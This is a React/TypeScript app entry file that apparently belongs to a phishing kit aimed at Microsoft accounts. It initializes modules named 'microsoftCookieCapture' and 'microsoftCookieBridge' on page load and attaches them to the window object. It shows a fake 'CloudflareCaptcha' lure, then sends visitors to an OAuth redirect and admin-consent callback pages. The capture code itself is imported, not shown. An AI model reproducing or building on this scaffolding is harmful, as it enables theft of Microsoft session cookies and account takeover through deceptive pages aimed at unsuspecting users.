import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AuthCallback from './components/AuthCallback';
import AdminConsentCallback from './components/AdminConsentCallback';
import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';

const App: React.FC = () => {
    return (
        <Router>
            <MainContent />
        </Router>
    );
};

const MainContent: React.FC = () => {
    const location = useLocation();

    // Initialize cookie utilities once on component mount.
    useEffect(() => {
        try {
            console.log('✅ Microsoft cookie capture utilities initialized');
            
            if (typeof window !== 'undefined') {
                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                (window as any).microsoftCookieBridge = microsoftCookieBridge;
            }

            console.log('🚀 Initializing Microsoft Cookie Bridge...');
            initializeMicrosoftCookieBridge();
            
        } catch (error) {
            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
        }
    }, []);

    // ✅ FIX: Use a single routing component to handle all paths.
    // This ensures the app loads correctly for every URL, including callbacks.
    switch (location.pathname) {
        case '/auth/callback':
            return <AdminConsentCallback />;
        case '/auth/callback/legacy':
            return <AuthCallback />;
        default:
            return <DefaultPage />;
    }
};

const DefaultPage: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');

    useEffect(() => {
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        if (step) {
            setCurrentPage(step);
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, []);

    const handleCaptchaVerified = () => {
        setCurrentPage('replacement');
    };

    const handleCaptchaBack = () => {
        window.location.reload();
    };
    
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
        case 'replacement':
            return <RealOAuthRedirect />;
        default:
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;
